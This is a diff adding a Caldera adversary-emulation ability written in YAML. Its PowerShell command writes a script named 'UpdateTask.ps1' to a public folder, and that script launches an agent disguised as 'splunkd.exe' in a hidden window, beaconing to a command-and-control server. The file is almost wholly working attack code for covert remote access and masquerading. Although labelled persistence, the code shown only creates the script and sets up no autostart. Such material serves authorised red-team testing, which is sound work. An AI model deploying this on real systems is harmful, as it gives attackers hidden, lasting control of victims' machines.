@@ -1,0 +1,44 @@
+# UUID: 5d02f0c1-72a8-4b1e-8d42-16af938a2b3e
+id: 5d02f0c1-72a8-4b1e-8d42-16af938a2b3e
+name: Create Caldera Agent PS1 Script for Startup
+description: Creates a PowerShell script on the target to launch the Caldera agent.
+tactic: persistence
+technique_id: T1059.001 # PowerShell
+privilege: User # To write to C:\Users\Public
+platforms:
+  windows:
+    psh:
+      command: |
+        $scriptDirectory = "C:\Users\Public"
+        $scriptPath = Join-Path -Path $scriptDirectory -ChildPath "UpdateTask.ps1"
+        $agentPath = "C:\Users\Public\splunkd.exe" # Path to your Caldera agent
+        $serverAddress = "http://10.2.20.2:8888" # Your Caldera server address
+        $agentGroup = "red" # Your Caldera agent group
+
+        $scriptContent = @"
+        # Script to start the Caldera agent
+        param(
+            [string]\$AgentExePath = "$($agentPath)",
+            [string]\$CalderaServer = "$($serverAddress)",
+            [string]\$GroupName = "$($agentGroup)"
+        )
+        try {
+            Start-Process -FilePath \$AgentExePath -ArgumentList "-server \$CalderaServer -group \$GroupName" -WindowStyle Hidden -ErrorAction Stop
+        } catch {
+            # Optional: Log error to a temp file for debugging startup issues
+            # Out-File -FilePath "C:\Users\Public\agent_startup_error.log" -Append -InputObject "Error at $(Get-Date): $($_.Exception.Message)"
+        }
+        "@ # Ensure this line maintains the same indentation as the lines of script above it.
+
+        try {
+            Set-Content -Path $scriptPath -Value $scriptContent -Force -Encoding UTF8 -ErrorAction Stop
+            Write-Host "Successfully created PowerShell script at: $scriptPath"
+        } catch {
+            Write-Error "Failed to create script $scriptPath: $($_.Exception.Message)"
+            exit 1
+        }
+      parsers:
+        plugins.stockpile.app.parsers.basic:
+          - source: file.path.agent_startup_script
+            edge: WasCreated
+            regex: 'Successfully created PowerShell script at:\s*(.+)'
